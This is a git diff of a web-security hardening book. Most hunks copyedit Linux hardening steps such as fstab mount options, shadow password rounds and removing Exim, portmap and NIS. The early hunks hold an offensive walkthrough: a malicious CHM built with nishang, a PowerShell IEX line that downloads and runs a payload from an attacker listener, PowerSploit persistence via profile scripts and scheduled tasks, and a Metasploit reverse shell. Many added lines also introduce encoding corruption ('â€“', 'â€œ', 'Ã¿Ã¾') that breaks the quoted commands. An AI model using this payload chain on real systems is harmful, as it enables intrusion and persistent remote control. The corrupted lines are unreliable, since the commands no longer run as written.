@@ -595,7 +595,7 @@ G> `Import-Module .\Out-CHM.ps1`
 
 {linenos=off, lang=PowerShell}
     # The command to create the CHM:
-    Out-CHM -PayloadScript C:\Users\kim\Desktop\persistentFetchRunPayload.ps1 –HHCPath “C:\Program Files (x86)\HTML Help Workshop”
+    Out-CHM -PayloadScript C:\Users\kim\Desktop\persistentFetchRunPayload.ps1 â€“HHCPath â€œC:\Program Files (x86)\HTML Help Workshopâ€
     # persistentFetchRunPayload.ps1 contains the following:
     IEX ((new-object net.webclient).downloadstring('http://<listener-attack-ip>/payload.txt '))
 
@@ -650,7 +650,7 @@ G> `PS C:\Source\PowerSploit\Persistence>$ElevatedOptions = New-ElevatedPersiste
 G> In case target runs virus with standard privileges, you need to run:  
 G> `PS C:\Source\PowerSploit\Persistence>$UserOptions = New-UserPersistenceOption -ScheduledTask -Hourly`
 G>
-G> This next command creates the script ([`Persistence.ps1`](#Persistence-ps1)), and its encoded form ([`EncodedPersistentScript.ps1`](#EncodedPersistentScript-ps1)) that, when downloaded from the attacker's hosting location and invoked atomically by the `doc.chm` created by `nishang` below, persists the contents of [`persistentFetchRunPayload.ps1`](#persistentFetchRunPayload-ps1) in its encoded form into the target's PowerShell profile. If the target is running as administrator when they open `doc.chm`, the contents of the `persistentFetchRunPayload.ps1` in its encoded form will be written to `%windir%\system32\Windows­PowerShell\v1.0\profile.ps1`, and an hourly scheduled task set to run `PowerShell.exe` as `System` will be created. If the target is running as a low privileged user when they open `doc.chm`, the contents of the `persistentFetchRunPayload.ps1` in its encoded form will be written to `%UserProfile%\Documents\Windows­PowerShell\profile.ps1`, and an hourly scheduled task will be set to run `PowerShell.exe` as the user. When `PowerShell.exe` runs, it implicitly runs what ever is in your `profile.ps1`  
+G> This next command creates the script ([`Persistence.ps1`](#Persistence-ps1)), and its encoded form ([`EncodedPersistentScript.ps1`](#EncodedPersistentScript-ps1)) that, when downloaded from the attacker's hosting location and invoked atomically by the `doc.chm` created by `nishang` below, persists the contents of [`persistentFetchRunPayload.ps1`](#persistentFetchRunPayload-ps1) in its encoded form into the target's PowerShell profile. If the target is running as administrator when they open `doc.chm`, the contents of the `persistentFetchRunPayload.ps1` in its encoded form will be written to `%windir%\system32\WindowsÂ­PowerShell\v1.0\profile.ps1`, and an hourly scheduled task set to run `PowerShell.exe` as `System` will be created. If the target is running as a low privileged user when they open `doc.chm`, the contents of the `persistentFetchRunPayload.ps1` in its encoded form will be written to `%UserProfile%\Documents\WindowsÂ­PowerShell\profile.ps1`, and an hourly scheduled task will be set to run `PowerShell.exe` as the user. When `PowerShell.exe` runs, it implicitly runs what ever is in your `profile.ps1`  
 G> `PS C:\Source\PowerSploit\Persistence>Add-Persistence -FilePath C:\Users\kim\Desktop\persistentFetchRunPayload.ps1 -ElevatedPersistenceOption $ElevatedOptions -UserPersistenceOption $UserOptions -Verbose -PassThru | Out-EncodedCommand | Out-File .\EncodedPersistentScript.ps1`
 G>
 G> Just as in the [PowerShell Exploitation via Office Documents](#vps-identify-risks-powershell-exploitation-via-office-documents-co-nishang) above, the `persistentFetchRunPayload.ps1` is used.  
@@ -699,17 +699,17 @@ G> I tried downloading and `I`nvoking `EX`pression from ISE using both
 {icon=bomb}
 G> before doing the same thing when running the `doc.chm` we create below. Both `Persistence.ps1` and `EncodedPersistentScript.ps1` gave me problems initially. It turned out that the actual file encoding of both files was not right. If you just copy either of the files from your Windows attack VM to your hosting directory on your Kali Linux VM, you may have the same issue. I ended up creating a new file in the hosting location and copy->pasting the file contents into the new file, which worked successfully. The first part of the error from `IEX` in ISE for `Persistence.ps1` was:
 G>
-G> `The term 'ÿþf u n c t i o n ' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again. At line:1 char:19`
+G> `The term 'Ã¿Ã¾f u n c t i o n ' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again. At line:1 char:19`
 G>
 G> For `EncodedPersistentScript.ps1` it was:
 G>
-G> `The term 'ÿþp o w e r s h e l l ' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again. At line:1 char:23`
+G> `The term 'Ã¿Ã¾p o w e r s h e l l ' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again. At line:1 char:23`
 G>
 G> See the funny characters? That's what gave it away.
 G>
 G> We now create `doc.chm`, or what ever you want to call it, informing `Out-CHM` that we want the payload of `doc.chm` to be the script ([`EncodedPersistentScript.ps1`](#EncodedPersistentScript-ps1)) we just created and hosted. When downloaded and invoked, it will persist the contents of [`persistentFetchRunPayload.ps1`](#persistentFetchRunPayload-ps1) in its encoded form to the PowerShell profile that belongs to the user who opened `doc.chm`. Run the following commands to create `doc.chm`:  
 G> `PS C:\Source\nishang\Client> Import-Module .\Out-CHM.ps1`  
-G> `PS C:\Source\nishang\Client>Out-CHM -PayloadURL http://<listener-attack-ip>/EncodedPersistentScript.ps1 –HHCPath “C:\Program Files (x86)\HTML Help Workshop”`
+G> `PS C:\Source\nishang\Client>Out-CHM -PayloadURL http://<listener-attack-ip>/EncodedPersistentScript.ps1 â€“HHCPath â€œC:\Program Files (x86)\HTML Help Workshopâ€`
 G>
 G> Next, we setup our Metasploit listener, ready to catch the reverse shell when our target runs  `doc.chm`. We use the same `powershell_msf.rc` resource file that `psmsf` created for us in the [PowerShell Exploitation with Psmsf](#powershell-exploitation-with-psmsf-play) play above.  
 G> Start your listener using the `powershell_msf.rc` resource rile:  
@@ -1184,7 +1184,7 @@ Without defender visibility, an attacker can access your system(s) and, alter, [
 
 With the continual push for shorter development cycles, combined with continuous delivery, as well as cloud and virtual based infrastructure, containers have become an important part of the continuous delivery pipeline. Docker has established itself as a top contender in this space.
 
-Many of Docker's defaults favour ease of use over security, in saying that, Docker's security considerations follow closely. After working with Docker, the research I have performed in writing these sections on Docker security, while having the chance to [discuss](http://www.se-radio.net/2017/05/se-radio-episode-290-diogo-monica-on-docker-security/) many of my concerns and ideas with the Docker Security team lead, Diogo Mónica, it is my belief that, by default, Docker containers, infrastructure and orchestration provide better security than running your applications in Virtual Machines (VMs). Just be careful when comparing containers with VMs, as this is analogous with comparing apples to oranges.
+Many of Docker's defaults favour ease of use over security, in saying that, Docker's security considerations follow closely. After working with Docker, the research I have performed in writing these sections on Docker security, while having the chance to [discuss](http://www.se-radio.net/2017/05/se-radio-episode-290-diogo-monica-on-docker-security/) many of my concerns and ideas with the Docker Security team lead, Diogo MÃ³nica, it is my belief that, by default, Docker containers, infrastructure and orchestration provide better security than running your applications in Virtual Machines (VMs). Just be careful when comparing containers with VMs, as this is analogous with comparing apples to oranges.
 
 Docker security provides immense configurability to improve its security posture many times over better than defaults. In order to do this properly, you will have to invest some time and effort into learning about the possible issues, features, and how to configure them. I have attempted to illuminate this specifically in these sections on Docker security.
 
@@ -1194,7 +1194,7 @@ A monolithic kernel, such as the Linux kernel, which contains tens of millions o
 
 Docker leverage's many features that have been in the Linux kernel for years, which provide many security enhancements out of the box. The Docker Security Team are working hard to add additional tooling and techniques to further harden their components, this has become obvious as I have investigated many of them. You still need to know what all the features, tooling and techniques are, and how to use them, in order to determine whether your container security is adequate for your needs.
 
-From the [Docker overview](https://docs.docker.com/engine/understanding-docker/), it states: “_Docker provides the ability to package and run an application in a loosely isolated environment_”. Later in the same document it says: "_Each container is an isolated and secure application platform, but can be given access to resources running in a different host or container_" leaving the "loosely" out. It continues to say: “_Encapsulate your applications (and supporting components) into Docker containers_”. The meaning of encapsulate is to enclose, but Ii we are only loosely isolating, then we’re not really enclosing are we? I will address this concern in the following Docker sections and subsections.
+From the [Docker overview](https://docs.docker.com/engine/understanding-docker/), it states: â€œ_Docker provides the ability to package and run an application in a loosely isolated environment_â€. Later in the same document it says: "_Each container is an isolated and secure application platform, but can be given access to resources running in a different host or container_" leaving the "loosely" out. It continues to say: â€œ_Encapsulate your applications (and supporting components) into Docker containers_â€. The meaning of encapsulate is to enclose, but Ii we are only loosely isolating, then weâ€™re not really enclosing are we? I will address this concern in the following Docker sections and subsections.
 
 To start with, I am going to discuss many areas where we can improve container security. At the end of this Docker section I will discuss why application security is of far more concern than container security.
 
@@ -1594,7 +1594,7 @@ I recommend using apt-cacher-ng, installable with an `apt-get`, you will have to
 {linenos=off, lang=Bash}
     # IP is the address of your apt-cacher server
     # Port is the port that your apt-cacher is listening on, usually 3142
-    Acquire::http::Proxy “http://[IP]:[Port]”;
+    Acquire::http::Proxy â€œhttp://[IP]:[Port]â€;
 
 Now, just replace the apt proxy references in the `/etc/apt/sources.list` of your consuming servers with the internet mirror you want to use, thus we contain all the proxy related config in one line in one file. This will allow the requests to be proxied and packages cached via the apt cache on your network when requests are made to the mirror of your choosing.
 
@@ -1627,7 +1627,7 @@ How do you know if you already have the Shadow Suite installed? If you have a `/
 
 &nbsp;
 
-It may be worth looking at and modifying the `/etc/shadow` file. Consider changing the “maximum password age” and “password warning period”. Consult the man page for shadow for full details. Check that you are happy with which encryption algorithms are currently being used. The files you will need to look at are: `/etc/shadow` and `/etc/pam.d/common-password`. The man pages you will probably need to read in conjunction with each other are the following:
+It may be worth looking at and modifying the `/etc/shadow` file. Consider changing the â€œmaximum password ageâ€ and â€œpassword warning periodâ€. Consult the man page for shadow for full details. Check that you are happy with which encryption algorithms are currently being used. The files you will need to look at are: `/etc/shadow` and `/etc/pam.d/common-password`. The man pages you will probably need to read in conjunction with each other are the following:
 
 * shadow
 * pam.d
@@ -1648,7 +1648,7 @@ The OWASP advice says we should double the rounds every subsequent two years. So
 
 How can you tell which algorithm you are using, salt size, number of iterations for the computed password, etc? The [crypt 3](http://man7.org/linux/man-pages/man3/crypt.3.html#NOTES) man page explains it all. By default a Debian install will be using SHA-512 which is better than MD5 and the smaller SHA-256. Don't take my word for it though, just have a look at the `/etc/shadow` file. I explain the file format below.
 
-By default, I did not have a “rounds” option in my `/etc/pam.d/common-password` module-arguments. Having a large iteration count (number of times the encryption algorithm is run (key stretching)) and an attacker not knowing what that number is, will slow down a brute-force attack.
+By default, I did not have a â€œroundsâ€ option in my `/etc/pam.d/common-password` module-arguments. Having a large iteration count (number of times the encryption algorithm is run (key stretching)) and an attacker not knowing what that number is, will slow down a brute-force attack.
 
 You can increase the `rounds` by overriding the default in `/etc/pam.d/common-passwowrd`. You override the default by adding the rounds field and the value you want to use, as seen below.
 
@@ -1872,7 +1872,7 @@ When you connect to a remote host via SSH that you have not established a trust 
     RSA key fingerprint is 23:d9:43:34:9c:b3:23:da:94:cb:39:f8:6a:95:c6:bc.
     Are you sure you want to continue connecting (yes/no)?
 
-Do you type yes to continue without actually knowing that it is the host you think it is? Well, if you do, you should be more careful. The fingerprint that is being put in front of you could be from a Man In the Middle (MItM). You can query the target (from “its” shell of course) for the fingerprint of its key easily. On Debian you will find the keys in `/etc/ssh/`
+Do you type yes to continue without actually knowing that it is the host you think it is? Well, if you do, you should be more careful. The fingerprint that is being put in front of you could be from a Man In the Middle (MItM). You can query the target (from â€œitsâ€ shell of course) for the fingerprint of its key easily. On Debian you will find the keys in `/etc/ssh/`
 
 When you enter the following:
 
@@ -2118,45 +2118,45 @@ All the major hypervisors should provide a way to disable all boot options other
 
 While you are at it, [set](http://kb.vmware.com/selfservice/microsites/search.do?language=en_US&cmd=displayKC&externalId=1004129) a BIOS password.
 
-#### Lock Down the Mounting of Partitions {#vps-countermeasures-disable-remove-services-harden-what-is-left-lock-down-the-mounting-of-partitions}
+#### Lock Down Partition Mounting {#vps-countermeasures-disable-remove-services-harden-what-is-left-lock-down-the-mounting-of-partitions}
 ![](images/ThreatTags/PreventionAVERAGE.png)
 
 **File Permission and Ownership Level**
 
 Addressing the [first risk](#vps-identify-risks-unnecessary-and--vulnerable-services-overly-permissive-file-permissions-ownership-and-lack-of-segmentation-mitigations) as discussed in the "[Overly Permissive File Permissions, Ownership and Lack of Segmentation](#vps-identify-risks-unnecessary-and--vulnerable-services-overly-permissive-file-permissions-ownership-and-lack-of-segmentation)" section of the Identify Risks section:
 
-The first thing to do is locate the files with overly permissive permissions and ownership. Running the suggested tools is a good place to start. From there, following your nose to find any others is a good idea. Then tighten them up so that they conform to the least amount of privilege and ownership necessary in order for the legitimate services/activities to run. Also consider removing any `suid` bits on executables `chmod u-s <yourfile>`. We also address applying `nosuid` to our mounted file systems below which provide a nice safety net.
+Locate the files with overly permissive permissions and ownership. Run the suggested tools as a good place to start. From there, follow your instincts to find any others. Then tighten up permissions so that they conform to the least amount of privilege and ownership necessary in order for the legitimate services/activities to run. Also consider removing any `suid` bits on executables `chmod u-s <yourfile>`. We also address applying `nosuid` to our mounted file systems below, which provides a nice safety net.
 
 **Mount Point of the File Systems**
 
 Addressing the [second risk](#vps-identify-risks-unnecessary-and--vulnerable-services-overly-permissive-file-permissions-ownership-and-lack-of-segmentation-mitigations) as discussed in the "[Overly Permissive File Permissions, Ownership and Lack of Segmentation](#vps-identify-risks-unnecessary-and--vulnerable-services-overly-permissive-file-permissions-ownership-and-lack-of-segmentation)" section of the Identify Risks section:
 
-Let us get started with your `fstab`.
+Start with your `fstab`.
 
-Make a backup of your `/etc/fstab` file before you make changes, this is really important, it is often really useful to just swap the modified `fstab` with the original as you are progressing through your modifications. Read the man page for fstab and also the options section in the mount man page. The Linux File System Hierarchy ([FSH](http://www.tldp.org/LDP/Linux-Filesystem-Hierarchy/html/index.html)) documentation is worth consulting also for directory usages. The following was my work-flow:
+Make a backup of your `/etc/fstab` file before you make changes, this is really important. It is often really useful to just swap the modified `fstab` with the original as you are progressing through your modifications. Read the man page for fstab and also the options section in the mount man page. The Linux File System Hierarchy ([FSH](http://www.tldp.org/LDP/Linux-Filesystem-Hierarchy/html/index.html)) documentation is worth consulting as well specific to directory usage. The following is my work-flow:
 
-Before you modify and remount `/tmp`, view what its currently mounted options look like with:
+Before you modify and remount `/tmp`, view what its currently mounted options are with:
 
 {linenos=off, lang=Bash}
     mount | grep ' /tmp'
 
 Add the `noexec` mount option to `/tmp` but not `/var` because executable shell scripts such as `*pre[inst, rm]` and `*post[inst, rm]` reside within `/var/lib/dpkg/info`. You can also add the `nodev,nosuid` options to `/tmp`.
 
-So you should have the following line in `/etc/fstab` now looking like this:
+You should have the following line in `/etc/fstab`:
 
 {title="/etc/fstab", linenos=off, lang=Bash}
     UUID=<block device ID goes here> /tmp ext4 defaults,noexec,nodev,nosuid 0 2
 
-Then to apply the new options from `/etc/fstab`:
+Then apply the new options from `/etc/fstab`:
 
 {linenos=off, lang=Bash}
     sudo mount -o remount /tmp
 
-Then by issuing the `sudo mount | grep ' /tmp'` command again, you'll see your new options applied.
+Issue the `sudo mount | grep ' /tmp'` command again, you'll see your new options applied.
 
-You can add the `nodev` option to `/home`, `/opt`, `/usr` and `/var` also. You can also add the `nosuid` option to `/home`. You can add `ro` to `/usr`
+You can add the `nodev` option to `/home`, `/opt`, `/usr` and `/var` as well. You can also add the `nosuid` option to `/home` and `ro` to `/usr`
 
-So you should have the following lines, as well as the above `/tmp` in `/etc/fstab` now looking like this:
+You should now have the following lines, as well as the above `/tmp` in `/etc/fstab`:
 
 {title="/etc/fstab", linenos=off, lang=Bash}
     UUID=<block device ID goes here> /home ext4 defaults,nodev,nosuid 0 2
@@ -2182,7 +2182,7 @@ Now have a look at the changed options applied to your mounts:
 {linenos=off, lang=Bash}
     mount
 
-You can now bind some target [mounts onto existing directories](http://www.cyberciti.biz/faq/linux-add-nodev-nosuid-noexec-options-to-temporary-storage-partitions/). I had only limited success with this technique, so keep reading. The lines to add to the `/etc/fstab` are as per the following. The file system type should be specified as `none` (as stated in the “The bind mounts” section of the [mount](http://man.he.net/man8/mount) man page. The `bind` option binds the mount. There was a bug with the suidperl package in Debian where setting `nosuid` created an insecurity. suidperl is no longer available in Debian:
+You can now bind some target [mounts onto existing directories](http://www.cyberciti.biz/faq/linux-add-nodev-nosuid-noexec-options-to-temporary-storage-partitions/). I had only limited success with this technique, so keep reading. The lines to add to the `/etc/fstab` are as per the following. The file system type should be specified as `none` (as stated in the â€œThe bind mountsâ€ section of the [mount](http://man.he.net/man8/mount) man page. The `bind` option binds the mount. There was a bug with the suidperl package in Debian where setting `nosuid` created an insecurity. suidperl is no longer available in Debian:
 
 {title="/etc/fstab", linenos=off, lang=Bash}
     /var/tmp /var/tmp none rw,noexec,nosuid,nodev,bind 0 2
@@ -2194,7 +2194,7 @@ Before you remount the above changes, you can view the options for the current m
 {linenos=off, lang=Bash}
     mount
 
-Then remount the above immediately, thus taking effect before a reboot, which is the safest way, as if you get the mounts incorrect, your system may fail to boot in some cases, which means you will have to boot a live CD to modify the `/etc/fstab`, execute the following commands:
+Then remount the above immediately, thus taking effect before a reboot. This is the safest way, as if you get the mounts incorrect, your system may fail to boot in some cases, which means you will have to boot a live CD to modify the `/etc/fstab`. Execute the following commands:
 
 {linenos=off, lang=Bash}
     sudo mount --bind /var/tmp /var/tmp
@@ -2207,19 +2207,15 @@ Then to pick up the new options from `/etc/fstab`:
     sudo mount -o remount /var/log
     sudo mount -o remount /usr/share
 
-Now have a look at the changed options applied to your mounts:
-
+Now have a look at the changed options applied to your mounts.
 For further details consult the remount option of the mount man page.
-
 At any point you can check the options that you have your directories mounted as, by issuing the following command:
 
 {linenos=off, lang=Bash}
     mount
 
-&nbsp;
-
-As mentioned above, I had some troubles adding these mounts to existing directories, I was not able to get all options applied, so I decided to take another backup of the VM (I would highly advise you to do the same if you are following along) and run the machine from a live CD (Knoppix in my case). I Ran Disk Usage Analyzer to work out which sub directories of `/var` and `/usr` were using how much disk space, to work out how much to reduce the sizes of partitions that `/var` and `/usr` were mounted on, in order to provide that space to sub directories (`/var/tmp`, `/var/log` and `/usr/share`) on new partitions.  
-Run gparted and unmount the relevant directory from its partition (`/var` from `/dev/sda5`, and `/usr` from `/dev/sda8` in this case). Reduce the size of the partitions, by the size of the new partitions you want taken from it. Locate the unallocated partition of the size that you just reduced the partition you were working on, and select new from the context menu. Set the File system type to `ext4` and click Add -> Apply All Operations -> Apply. You should now have the new partition.
+As mentioned above, I had some troubles adding these mounts to existing directories, I was not able to get all options applied, so I decided to take another backup of the VM (I would highly advise you to do the same if you are following along) and run the machine from a live CD (Knoppix in my case). I ran Disk Usage Analyzer to work out which sub directories of `/var` and `/usr` were using how much disk space and to work out how much to reduce the sizes of partitions that `/var` and `/usr` were mounted on in order to provide that space to sub directories (`/var/tmp`, `/var/log` and `/usr/share`) on new partitions.  
+Run gparted and unmount the relevant directory from its partition (`/var` from `/dev/sda5`, and `/usr` from `/dev/sda8` in this case). Reduce the size of the partitions, by the size of the new partitions you want taken from it. Locate the unallocated partition of the size that you just reduced the partition you were working, and select new from the context menu. Set the File system type to `ext4` and click Add -> Apply All Operations -> Apply. You should now have the new partition.
 
 Now you will need to mount the original partition that you resized and the new partition. Open a terminal with an extra tab. In the left terminal go to where you mounted the original partition (`/media/sda5/tmp/` for example), in the right terminal go to where you mounted the new partition (`/media/sda11/` for example).
 
@@ -2292,7 +2288,7 @@ Test your `noexec` by putting the following script in `/var`, and changing the p
     # Make sure execute bits are on.
     sudo chmod 755 /var/kimsTest
 
-Copying it to `/var/tmp`, and `/var/log`, Then try running each of them. You should only be able to run the one that is in the directory mounted without the `noexec` option. My file “kimsTest” looks like this:
+Copy it to `/var/tmp`, and `/var/log`, then try running each of them. You should only be able to run the one that is in the directory mounted without the `noexec` option. My file, kimsTest,looks like this:
 
 {title="kimsTest", linenos=off, lang=Bash}
     #!/bin/sh
@@ -2308,12 +2304,12 @@ Try running them:
     you@your_server:/var$ ./log/kimsTest
     -bash: ./tmp/kimsTest: Permission denied
 
-If you set `/tmp` with `noexec` and / or `/usr` with read-only (`ro`), then you will also need to modify or create if it does not exist, the file `/etc/apt/apt.conf` and also the referenced directory that apt will write to. The file could look something like the following:
+If you set `/tmp` with `noexec` and / or `/usr` with read-only (`ro`), you will also need to modify or create `/etc/apt/apt.conf` if it does not exist, and also the referenced directory that apt will write to. The file could look something like the following:
 
 {title="/etc/apt/apt.conf", linenos=off, lang=Bash}
     # IP is the address of your apt-cacher server
     # Port is the port that your apt-cacher is listening on, usually 3142
-    Acquire::http::Proxy “http://[IP]:[Port]”;
+    Acquire::http::Proxy â€œhttp://[IP]:[Port]â€;
 
     # http://www.debian.org/doc/manuals/securing-debian-howto/ch4.en.html#s4.10.1
     # Set an alternative temp directory to /tmp if /tmp in /etc/fstab is noexec,
@@ -2340,11 +2336,11 @@ If you set `/tmp` with `noexec` and / or `/usr` with read-only (`ro`), then you 
        };
     };
 
-You can spend quite a bit of time experimenting with your mounts and testing. It is well worth locking these down as tightly as you can, make sure you test properly before you reboot, unless you are happy modifying things further via a live CD. This set-up will almost certainly not be perfect for you, there are many options you can apply, some may work for you, some may not. Be prepared to keep adjusting these as time goes on, you will probably find that something can not execute where it is supposed to, or some other option you have applied is causing some trouble. In which case you may have to relax some options, or consider tightening them up more. Good security is always an iterative approach. You can not know today, what you are about to learn tomorrow. 
+You can spend quite a bit of time experimenting with and testing your mounts. It is well worth locking these down as tightly as you can, make sure you test properly before you reboot, unless you are happy modifying things further via a Live CD. This setup will almost certainly be imperfect, there are many options you can apply, some may work for you, some may not. Be prepared to keep adjusting these as time goes on, you will probably find that something can not execute where it is supposed to, or some other option you have applied is causing some trouble. In this case, you may have to relax some options, or consider tightening them up more. Good security is always an iterative process. You can not know today, what you are about to learn tomorrow. 
 
-You can also look at enabling a [read-only `/` mount](https://wiki.debian.org/ReadonlyRoot#Enable_readonly_root)
+Consider enabling a [read-only `/` mount](https://wiki.debian.org/ReadonlyRoot#Enable_readonly_root)
 
-Also consider the pros and cons of [increasing](http://www.cyberciti.biz/tips/what-is-devshm-and-its-practical-usage.html) your shared memory (via `/run/shm`) vs not increasing it.
+Also review the pros and cons of [increasing](http://www.cyberciti.biz/tips/what-is-devshm-and-its-practical-usage.html) your shared memory (via `/run/shm`) vs not doing so.
 
 Check out the [Additional Resources](#additional-resources-vps-locking-down-the-mounting-of-partitions) chapter for extra resources in working with your mounts.
 
@@ -2355,9 +2351,9 @@ Check out the [Additional Resources](#additional-resources-vps-locking-down-the-
     dpkg-query -l '*portmap*'
     dpkg-query: no packages found matching *portmap*
 
-If port mapper is not installed (default on debian web server), we do not need to remove it. Recent versions of Debian will use the `portmap` replacement of `rpcbind` instead. If you find port mapper is installed, you do not need it on a web server, and if you are hardening a file server, you may require `rpcbind`. For example there are two packages required if you want to support NFS on your server: nfs-kernel-server and nfs-common, the latter has a [dependency on `rpcbind`](https://packages.debian.org/stretch/nfs-common).
+If port mapper is not installed (default on debian web server), we do not need to remove it. Recent versions of Debian will use `portmap's` replacement, `rpcbind` instead. If you find port mapper is installed, you do not need it on a web server, and if you are hardening a file server, you may require `rpcbind`. For example there are two packages required if you want to support NFS on your server: nfs-kernel-server and nfs-common, the latter has a [dependency on `rpcbind`](https://packages.debian.org/stretch/nfs-common).
 
-The `portmap` service (version 2 of the port mapper protocol) would [convert](http://www.linux-nis.org/nis-howto/HOWTO/portmapper.html) RPC program numbers into TCP/IP (or UDP/IP) protocol port numbers. When an RPC server (such as NFS prior to v4) was started, it would instruct the port mapper which port number it was listening on, and which RPC program numbers it is prepared to serve. When clients wanted to make an RPC call to a given program number, the client would first contact the `portmap` service on the server to enquire of which port number its RPC packets should be sent. [`Rpcbind`](#vps-countermeasures-disable-remove-services-harden-what-is-left-remove-rpcbind) which uses version 3 and 4 of the port mapper protocol (called the rpcbind protocol) does things a little differently.
+The `portmap` service (version 2 of the port mapper protocol) [converts](http://www.linux-nis.org/nis-howto/HOWTO/portmapper.html) RPC program numbers into TCP/IP (or UDP/IP) protocol port numbers. When an RPC server (such as NFS prior to v4) is started, it instructs the port mapper which port number it is listening on, and which RPC program numbers it is prepared to serve. When clients want to make an RPC call to a given program number, the client first contacts the `portmap` service on the server to enquire of which port number its RPC packets should be sent. [`Rpcbind`](#vps-countermeasures-disable-remove-services-harden-what-is-left-remove-rpcbind) which uses version 3 and 4 of the port mapper protocol (called the rpcbind protocol) does things a little differently.
 
 You can also stop `portmap` responses by modifying the two below hosts files like so: 
 
@@ -2367,11 +2363,11 @@ You can also stop `portmap` responses by modifying the two below hosts files lik
 {title="/etc/hosts.deny", linenos=off, lang=Bash}
     portmap : ALL
 
-but ideally, if you do need the port mapper running, consider upgrading to `rpcbind` for starters, then check the [`rpcbind` section](#vps-countermeasures-disable-remove-services-harden-what-is-left-remove-rpcbind) below for countermeasures, 
+but ideally, if you do need the port mapper running, consider upgrading to `rpcbind`, then check the [`rpcbind` section](#vps-countermeasures-disable-remove-services-harden-what-is-left-remove-rpcbind) below for countermeasures, 
 
-The above changes to the two hosts files would be effective immediately. A restart of the port mapper is not required in this case.
+The above changes to the two hosts files are effective immediately. A restart of the port mapper is not required in this case.
 
-There are further details around the `/etc/hosts.[deny & allow]` in the [NFS section](#vps-countermeasures-disable-remove-services-harden-what-is-left-nfs)
+There are further details specific to the `/etc/hosts.[deny & allow]` in the [NFS section](#vps-countermeasures-disable-remove-services-harden-what-is-left-nfs)
 
 #### Disable, Remove Exim {#vps-countermeasures-disable-remove-services-harden-what-is-left-disable-exim}
 ![](images/ThreatTags/PreventionEASY.png)
@@ -2379,23 +2375,23 @@ There are further details around the `/etc/hosts.[deny & allow]` in the [NFS sec
 {linenos=off, lang=Bash}
     dpkg-query -l '*exim*'
 
-This will probably show that Exim4 is currently installed.
+This will probably confirm that Exim4 is currently installed.
 
 If so, before exim4 is disabled, a `netstat -tlpn` will produce output similar to the following:
 
 ![](images/NetstatBeforeEximDisabled.png)
 
-Which shows that exim4 is listening on localhost and it is not publicly accessible. Nmap confirms this, but we do not need it, so lets disable it. You could also use the more modern ss program too. You may also notice `monit` and `nodejs` listening in these results. Both [`monit`](#vps-countermeasures-lack-of-visibility-proactive-monitoring-getting-started-with-monit) and our [`nodejs`](#vps-countermeasures-lack-of-visibility-proactive-monitoring-keep-nodejs-application-alive) application is set-up under the Proactive Monitoring section later in this chapter.
+This shows that exim4 is listening on localhost and it is not publicly accessible. Nmap confirms this, but we do not need it, so let's disable it. You could also use the more modern ss program too. You may also notice `monit` and `nodejs` listening in these results. Both [`monit`](#vps-countermeasures-lack-of-visibility-proactive-monitoring-getting-started-with-monit) and our [`nodejs`](#vps-countermeasures-lack-of-visibility-proactive-monitoring-keep-nodejs-application-alive) application are set up under the Proactive Monitoring section later in this chapter.
 
-When a [run level](https://www.debian-administration.org/article/212/An_introduction_to_run-levels) is entered, `init` executes the target files that start with `K`, with a single argument of stop, followed with the files that start with `S` with a single argument of start. So by renaming `/etc/rc2.d/S15exim4` to `/etc/rc2.d/K15exim4` you are causing `init` to run the service with the stop argument when it moves to run level 2. Just out of interest sake, the scripts at the end of the links with the lower numbers are executed before scripts at the end of links with the higher two digit numbers. Now go ahead and check the directories for run levels 3-5 as well, and do the same. You will notice that all the links in `/etc/rc0.d/` (which are the links executed on system halt) start with `K`. Is it making sense?
+When a [run level](https://www.debian-administration.org/article/212/An_introduction_to_run-levels) is entered, `init` executes the target files that start with `K`, with a single argument of stop, followed with the files that start with `S` with a single argument of start. By renaming `/etc/rc2.d/S15exim4` to `/etc/rc2.d/K15exim4` you are causing `init` to run the service with the stop argument when it moves to run level 2. The scripts at the end of the links with the lower numbers are executed before scripts at the end of links with the higher two digit numbers. Go ahead and check the directories for run levels 3-5 as well, and do the same. You will notice that all the links in `/etc/rc0.d/` (which are the links executed on system halt) start with `K`. Make sense?
 
 Follow up with another `sudo netstat -tlpn`:
 
 ![](images/NetstatAfterEximDisabled.png)
 
-And that is all we should see. If you don't have monit or node running, you won't see them either of course.
+This is all we should see. If you don't have monit or node running, you won't obviously see them either.
 
-Later on I started receiving errors from `apt-get update && upgrade`:
+Later, I received errors from `apt-get update && upgrade`:
 
 {linenos=off, lang=Bash}
     Setting up exim4-config (4.86.2-1) ...
@@ -2417,7 +2413,7 @@ Removing the following packages will solve that:
 #### Remove NIS
 ![](images/ThreatTags/PreventionEASY.png)
 
-If Network Information Service (NIS) or the replacement NIS+ is installed, ideally you will want to remove it. If you needed centralised authentication for multiple machines, you could set-up an LDAP server and configure PAM on your machines in order to contact the LDAP server for user authentication. If you are in the cloud, you could look at using the platforms directly service, such as [AWS Directory Service](https://aws.amazon.com/directoryservice/). We may have no need for distributed authentication on our web server at this stage.
+If Network Information Service (NIS), or its replacement NIS+ is installed, you will want to remove it. If you need centralised authentication for multiple machines, set up an LDAP server and configure PAM on your machines in order to contact the LDAP server for user authentication. If you are in the cloud, you could use the platform's service, such as [AWS Directory Service](https://aws.amazon.com/directoryservice/). We may have no need for distributed authentication on our web server at this stage.
 
 Check to see if NIS is installed by running the following command:
 
@@ -2426,12 +2422,12 @@ Check to see if NIS is installed by running the following command:
 
 Nis is not installed by default on a Debian web server, so in this case, we do not need to remove it.
 
-If the host you were hardening had the role of a file server and was running NFS, and you need directory services, then you may need something like Kerberos and/or LDAP. There is plenty of documentation and tutorials on Kerberos and LDAP and replacing NIS with them.
+If the host you are hardening is a file server, running NFS, and you need directory services, then you may need Kerberos and/or LDAP. There is plenty of documentation and tutorials on Kerberos and LDAP and replacing NIS with them.
 
 #### Rpcbind {#vps-countermeasures-disable-remove-services-harden-what-is-left-remove-rpcbind}
 ![](images/ThreatTags/PreventionEASY.png)
 
